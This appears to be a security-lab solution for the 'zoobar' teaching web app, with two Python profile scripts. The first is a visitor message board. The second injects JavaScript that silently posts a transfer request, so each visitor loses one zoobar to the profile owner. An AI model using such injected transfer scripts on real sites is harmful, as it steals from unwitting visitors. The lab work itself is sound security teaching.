'''
Message is intuitive 
(1) Message :Allow the visitor to post a message, and display all messages posted by previous visitors.

(2) Zoobar theft: Any visitor visiting this profile will lose 1 zoobar.
'''
## The 1st profile: Message system

#!python
import time, errno

global api
selfuser = api.call('get_self')
visitor = api.call('get_visitor')

messages = api.call('get_messages', username=selfuser)

print 'Messages:\n', '<ul>'

for message in messages:
  print '<li>%s: %s: %s</li>' % (message["time"], message["sender"], message["text"])

print '</ul>'

def post_box():
    template = """
<form method="POST" name="messageform">
    <textarea name="message" rows="20" cols="80"></textarea>
    <br />
    <input type="submit" name="message_submit" value="Send" />
</form>
    """
    return template

print post_box()


#!python
import time, errno

global api
selfuser = api.call('get_self')

print """
<script>
xmlhttp=new XMLHttpRequest();
xmlhttp.open("POST","transfer",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("zoobars=1&recipient=%s");
</script>
""" % selfuser
